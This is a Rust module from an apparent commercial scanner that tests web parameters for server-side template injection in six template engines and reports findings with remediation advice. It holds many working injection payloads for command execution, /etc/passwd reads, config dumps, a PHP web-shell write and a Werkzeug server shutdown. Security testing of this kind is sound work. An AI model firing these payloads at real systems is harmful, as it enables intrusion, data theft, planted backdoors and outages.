// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct SstiAdvancedScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

impl SstiAdvancedScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        let uuid_str = uuid::Uuid::new_v4().to_string();
        let marker_base = uuid_str.replace("-", "");
        let test_marker = format!("ssti_{}", &marker_base[..8]);
        Self {
            http_client,
            test_marker,
        }
    }

    /// Scan endpoint for advanced SSTI vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing advanced Server-Side Template Injection vulnerabilities");

        let (vulns, tests) = self.test_jinja2_ssti(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_twig_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_freemarker_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_velocity_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_handlebars_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_pug_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_polyglot_ssti(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Jinja2 SSTI (Python)
    async fn test_jinja2_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 15;

        debug!("Testing Jinja2 SSTI payloads");

        let variable_interpolation = format!("{{{{{}}}}}", self.test_marker);
        let jinja2_payloads = vec![
            ("{{7*7}}", "49", "Basic arithmetic"),
            (variable_interpolation.as_str(), self.test_marker.as_str(), "Variable interpolation"),
            ("{{config}}", "SECRET_KEY", "Config object access"),
            ("{{config.items()}}", "SECRET", "Config enumeration"),
            ("{{request}}", "environ", "Request object access"),
            ("{{self.__init__.__globals__}}", "os", "Globals access"),
            ("{{''.__class__.__mro__[1].__subclasses__()}}", "object", "Class traversal"),
            ("{{request.application.__globals__.__builtins__}}", "__import__", "Builtins access"),
            ("{% for item in [].__class__.__base__.__subclasses__() %}{{item}}{% endfor %}", "subprocess", "Subprocess enumeration"),
            ("{{lipsum.__globals__}}", "os", "Lipsum globals"),
            ("{{cycler.__init__.__globals__.os}}", "popen", "Cycler OS access"),
            ("{{joiner.__init__.__globals__.os}}", "system", "Joiner OS access"),
            ("{{namespace.__init__.__globals__.os}}", "environ", "Namespace OS access"),
            ("{{().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')}}", "uid=", "RCE via subprocess"),
            ("{{request.environ['werkzeug.server.shutdown']()}}", "Server", "Werkzeug shutdown"),
        ];

        for (payload, indicator, description) in jinja2_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Jinja2", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Twig SSTI (PHP)
    async fn test_twig_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 12;

        debug!("Testing Twig SSTI payloads");

        let twig_payloads = vec![
            ("{{7*7}}", "49", "Basic arithmetic"),
            ("{{_self}}", "Twig", "Self object access"),
            ("{{_self.env}}", "getFilter", "Environment access"),
            ("{{dump(app)}}", "request", "App dump"),
            ("{{app.request.server.all}}", "DOCUMENT_ROOT", "Server vars"),
            (r#"{{['id']|filter('system')}}"#, "uid=", "System filter"),
            (r#"{{['cat /etc/passwd']|filter('system')}}"#, "root:", "File read"),
            (r#"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"#, "uid=", "Filter callback RCE"),
            (r#"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"#, "uid=", "System callback RCE"),
            (r#"{{'<?php system($_GET[cmd]);?>'|file_put_contents('shell.php')}}"#, "shell.php", "File write"),
            ("{{1*1}}{{5*5}}", "125", "Concatenation"),
            (r#"{{['id',1]|sort('system')|join}}"#, "uid=", "Sort system"),
        ];

        for (payload, indicator, description) in twig_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Twig", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Freemarker SSTI (Java)
    async fn test_freemarker_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 10;

        debug!("Testing Freemarker SSTI payloads");

        let freemarker_payloads = vec![
            ("${7*7}", "49", "Basic arithmetic"),
            ("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}", "uid=", "Execute utility RCE"),
            ("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}", "Process", "ProcessBuilder"),
            ("<#assign classloader=object?class.protectionDomain.classLoader>", "ClassLoader", "ClassLoader access"),
            ("${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}", "root:", "File read"),
            ("${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")}", "Process", "Runtime exec"),
            ("<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"cat /etc/passwd\")}", "root:", "File read via Execute"),
            ("${\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\")}", "Process", "ScriptEngine RCE"),
            ("<#assign uri=\"freemarker.template.utility.ObjectConstructor\"?new()>", "Constructor", "Object constructor"),
            ("${object?api.class.getResource(\"file:///etc/passwd\").getContent()}", "root", "Resource access"),
        ];

        for (payload, indicator, description) in freemarker_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Freemarker", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Velocity SSTI (Java)
    async fn test_velocity_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 8;

        debug!("Testing Velocity SSTI payloads");

        let velocity_payloads = vec![
            ("#set($x=7*7)$x", "49", "Basic arithmetic"),
            ("#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))", "Process", "Runtime exec"),
            ("$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")", "Process", "Direct Runtime"),
            ("#set($s=\"\")$s.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")", "Process", "Reflection RCE"),
            ("$x.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"java.lang.Runtime.getRuntime().exec('id')\")", "Process", "ScriptEngine"),
            ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')", "Process", "Multi-step RCE"),
            ("$x.class.getResource(\"/etc/passwd\").getContent()", "root", "File read"),
            ("#foreach($i in [1..$type.type.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id').getClass()])$i#end", "Process", "Foreach RCE"),
        ];

        for (payload, indicator, description) in velocity_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Velocity", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Handlebars SSTI (Node.js)
    async fn test_handlebars_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 10;

        debug!("Testing Handlebars SSTI payloads");

        let handlebars_payloads = vec![
            ("{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').exec('id');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}", "uid=", "Complex RCE"),
            ("{{#each (lookup (lookup this 'constructor') 'prototype')}}", "Object", "Prototype access"),
            ("{{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}", "uid=", "Process mainModule"),
            ("{{#with this as |obj|}}\n{{#with (obj.constructor.constructor 'return process')() as |proc|}}\n{{proc.mainModule.require('child_process').execSync('id').toString()}}\n{{/with}}\n{{/with}}", "uid=", "With process"),
            ("{{lookup (lookup this 'constructor') 'constructor'}} ", "Function", "Constructor lookup"),
            ("{{#with this}}\n{{lookup constructor 'constructor'}}\n{{/with}}", "Function", "This constructor"),
            ("{{{}}}{{toString}}", "object Object", "Object toString"),
            ("{{global.process.mainModule.require('child_process').execSync('id').toString()}}", "uid=", "Global process"),
            ("wrtz{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('whoami');\"}}", "exec", "Partial RCE"),
            ("{{#if this}}{{lookup constructor.constructor 'prototype'}{{/if}}", "Object", "If constructor"),
        ];

        for (payload, indicator, description) in handlebars_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Handlebars", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Pug SSTI (Node.js)
    async fn test_pug_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 8;

        debug!("Testing Pug (Jade) SSTI payloads");

        let pug_payloads = vec![
            ("#{7*7}", "49", "Basic arithmetic"),
            ("#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('id')}()}", "uid=", "Process RCE"),
            ("#{global.process.mainModule.require('child_process').execSync('id').toString()}", "uid=", "ExecSync RCE"),
            ("#{function(){return global.process.mainModule.require('child_process').execSync('whoami').toString()}()}", "root", "Whoami"),
            ("- var x = root.process.mainModule.require\n- x('child_process').exec('id')", "exec", "Multiline RCE"),
            ("#{root.process.mainModule.require('child_process').exec('id')}", "exec", "Root process"),
            ("#{self.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}", "root:", "File read"),
            ("#{global.process.env}", "PATH", "Environment access"),
        ];

        for (payload, indicator, description) in pug_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Pug", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test polyglot SSTI payloads
    async fn test_polyglot_ssti(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 6;

        debug!("Testing polyglot SSTI payloads");

        let polyglot_marker = format!("${{{{{}}}}}", self.test_marker);
        let polyglot_payloads = vec![
            ("${{7*7}}{{7*7}}", "49", "Polyglot arithmetic"),
            ("${7*7}{{7*7}}#{7*7}", "49", "Triple engine"),
            (polyglot_marker.as_str(), self.test_marker.as_str(), "Polyglot marker"),
            ("a{*comment*}b", "ab", "Comment removal"),
            ("{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", "uid=", "Node.js polyglot"),
            ("${{<%[%'\"}}%\\", "{{", "Delimiter confusion"),
        ];

        for (payload, indicator, description) in polyglot_payloads {
            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Polyglot", description).await? {
                vulnerabilities.push(vuln);
                break;
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    async fn test_ssti_payload(
        &self,
        url: &str,
        payload: &str,
        indicator: &str,
        engine: &str,
        description: &str,
    ) -> anyhow::Result<Option<Vulnerability>> {
        let test_params = vec!["name".to_string(), "template".to_string(), "content".to_string(), "message".to_string(), "comment".to_string(), "search".to_string(), "q".to_string()];

        for param in test_params {
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code == 200 && response.body.contains(indicator) {
                        info!("{} SSTI detected via parameter '{}': {}", engine, param, description);

                        let severity = if description.contains("RCE") || description.contains("exec") || description.contains("File read") {
                            Severity::Critical
                        } else if description.contains("access") || description.contains("Config") {
                            Severity::High
                        } else {
                            Severity::Medium
                        };

                        let cvss = match severity {
                            Severity::Critical => 9.8,
                            Severity::High => 8.1,
                            Severity::Medium => 6.5,
                            _ => 4.0,
                        };

                        return Ok(Some(Vulnerability {
                            id: format!("ssti_adv_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: format!("Server-Side Template Injection ({})", engine),
                            severity,
                            confidence: Confidence::High,
                            category: "Injection".to_string(),
                            url: url.to_string(),
                            parameter: Some(param.to_string()),
                            payload: payload.to_string(),
                            description: format!("{} SSTI vulnerability - {}", engine, description),
                            evidence: Some(format!("Payload executed successfully. Indicator '{}' found in response", indicator)),
                            cwe: "CWE-94".to_string(),
                            cvss: cvss as f32,
                            verified: true,
                            false_positive: false,
                            remediation: self.get_remediation(engine),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        }));
                    }
                }
                Err(e) => {
                    debug!("SSTI test failed: {}", e);
                }
            }
        }

        Ok(None)
    }

    fn get_remediation(&self, engine: &str) -> String {
        let common = "1. Never pass user input directly to template engines\n\
                      2. Use sandboxed template environments\n\
                      3. Implement strict input validation and sanitization\n\
                      4. Use allowlists for permitted template constructs\n\
                      5. Disable dangerous functions and filters\n\
                      6. Implement Content Security Policy\n\
                      7. Regular security updates for template engines\n\
                      8. Use static templates when possible\n\
                      9. Implement proper error handling (don't expose stack traces)\n\
                      10. Regular penetration testing\n\n";

        let engine_specific = match engine {
            "Jinja2" => {
                "Jinja2-specific:\n\
                 - Use jinja2.sandbox.SandboxedEnvironment\n\
                 - Disable autoescape=False in production\n\
                 - Never use Jinja2 for user-controlled templates\n\
                 - Remove access to __builtins__, __import__, and globals\n\
                 - Use jinja2.select_autoescape()\n\
                 - Regular updates to Jinja2 library"
            }
            "Twig" => {
                "Twig-specific:\n\
                 - Enable Twig sandbox mode\n\
                 - Disable dangerous filters (filter, map, reduce, sort)\n\
                 - Remove access to _self and _context\n\
                 - Use strict_variables option\n\
                 - Disable autoescape at your own risk\n\
                 - Regular updates to Twig library"
            }
            "Freemarker" | "Velocity" => {
                "Java Template Engine:\n\
                 - Use latest version with security patches\n\
                 - Configure template loader to prevent file access\n\
                 - Disable ObjectConstructor and Execute utilities\n\
                 - Use SecurityManager to restrict class access\n\
                 - Implement strict template validation\n\
                 - Never expose Java objects to templates"
            }
            "Handlebars" | "Pug" => {
                "Node.js Template Engine:\n\
                 - Use vm2 or isolated-vm for sandboxing\n\
                 - Disable access to process, require, and global\n\
                 - Use strict mode\n\
                 - Implement template precompilation\n\
                 - Regular updates to template engine\n\
                 - Never render user-controlled templates"
            }
            _ => "Follow OWASP guidelines for template injection prevention"
        };

        format!("{}{}", common, engine_specific)
    }
}

mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> SstiAdvancedScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        SstiAdvancedScanner::new(http_client)
    }

    #[test]
    fn test_scanner_creation() {
        let scanner = create_test_scanner();
        assert!(scanner.test_marker.starts_with("ssti_"));
        assert_eq!(scanner.test_marker.len(), 13);
    }

    #[test]
    fn test_unique_markers() {
        let scanner1 = create_test_scanner();
        let scanner2 = create_test_scanner();
        assert_ne!(scanner1.test_marker, scanner2.test_marker);
    }

    #[test]
    fn test_remediation() {
        let scanner = create_test_scanner();

        let jinja2_rem = scanner.get_remediation("Jinja2");
        assert!(jinja2_rem.contains("SandboxedEnvironment"));
        assert!(jinja2_rem.contains("autoescape"));

        let twig_rem = scanner.get_remediation("Twig");
        assert!(twig_rem.contains("sandbox"));

        let freemarker_rem = scanner.get_remediation("Freemarker");
        assert!(freemarker_rem.contains("ObjectConstructor"));

        let handlebars_rem = scanner.get_remediation("Handlebars");
        assert!(handlebars_rem.contains("vm2"));
    }
}
